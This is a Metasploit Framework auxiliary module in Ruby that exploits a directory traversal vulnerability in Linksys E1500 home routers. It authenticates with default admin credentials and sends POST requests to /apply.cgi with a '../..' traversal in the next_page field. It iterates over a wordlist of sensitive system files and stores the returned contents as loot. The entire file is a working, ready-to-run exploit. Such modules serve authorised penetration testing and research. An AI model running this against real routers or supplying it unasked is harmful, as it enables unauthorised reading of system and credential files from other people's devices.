##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Linksys E1500 Directory Traversal Vulnerability',
      'Description' => %q{
          This module exploits a directory traversal vulnerability which is present in
        different Linksys home routers, like the E1500.
      },
      'References'  =>
        [
          [ 'URL', 'http://www.s3cur1ty.de/m1adv2013-004' ],
          [ 'URL', 'http://homekb.cisco.com/Cisco2/ukp.aspx?pid=80&app=vw&vw=1&login=1&json=1&docid=d7d0a87be9864e20bc347a73f194411f_KB_EN_v1.xml' ],
          [ 'BID', '57760' ],
          [ 'OSVDB', '89911' ],
          [ 'EDB', '24475' ]
        ],
      'Author'      => [ 'Michael Messner <devnull[at]s3cur1ty.de>' ],
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        OptPath.new('SENSITIVE_FILES',  [ true, "File containing senstive files, one per line",
          File.join(Msf::Config.install_root, "data", "wordlists", "sensitive_files.txt") ]),
        OptString.new('USERNAME',[ true, 'User to login with', 'admin']),
        OptString.new('PASSWORD',[ true, 'Password to login with', 'password']),

      ], self.class)
  end

  def extract_words(wordfile)
    return [] unless wordfile && File.readable?(wordfile)
    begin
      words = File.open(wordfile, "rb") do |f|
        f.read
      end
    rescue
      return []
    end
    save_array = words.split(/\r?\n/)
    return save_array
  end

  def find_files(file,user,pass)
    uri = "/apply.cgi"
    traversal = '../..'
    data_trav = "submit_type=wsc_method2&change_action=gozila_cgi&next_page=" << traversal << file
    res = send_request_cgi({
      'method'  => 'POST',
      'uri'     => uri,
      'authorization' => basic_auth(user,pass),
      'vars_post' => {
        "submit_type" => "wsc_method2",
        "change_action" => "gozila_cgi",
        "next_page" => traversal << file
      }
    })

    #without res.body.length we get lots of false positives
    if (res and res.code == 200 and res.body.length > 0)
      print_good("#{rhost}:#{rport} - Request may have succeeded on file #{file}")
      report_web_vuln({
          :host => rhost,
          :port => rport,
          :vhost => datastore['VHOST'],
          :path => uri,
          :pname => data_trav,
          :risk => 3,
          :proof => data_trav,
          :name => self.fullname,
          :category => "web",
          :method => "POST"
      })

      loot = store_loot("linksys.traversal.data","text/plain", rhost, res.body, file)
      vprint_good("#{rhost}:#{rport} - File #{file} downloaded to: #{loot}")
    elsif (res and res.code)
      vprint_error("#{rhost}:#{rport} - Attempt returned HTTP error #{res.code} when trying to access #{file}")
    end
  end

  def run_host(ip)
    user = datastore['USERNAME']
    pass = datastore['PASSWORD']

    vprint_status("#{rhost}:#{rport} - Trying to login with #{user} / #{pass}")

    #test login
    begin
      res = send_request_cgi({
        'uri' => '/',
        'method' => 'GET',
        'authorization' => basic_auth(user,pass)
      })

      return if res.nil?
      return if (res.headers['Server'].nil? or res.headers['Server'] !~ /httpd/)
      return if (res.code == 404)

      if [200, 301, 302].include?(res.code)
        vprint_good("#{rhost}:#{rport} - Successful login #{user}/#{pass}")
      else
        vprint_error("#{rhost}:#{rport} - No successful login possible with #{user}/#{pass}")
        return
      end

    rescue ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - Failed to connect to the web server")
      return
    end

    extract_words(datastore['SENSITIVE_FILES']).each do |file|
      find_files(file, user, pass) unless file.empty?
    end
  end
end
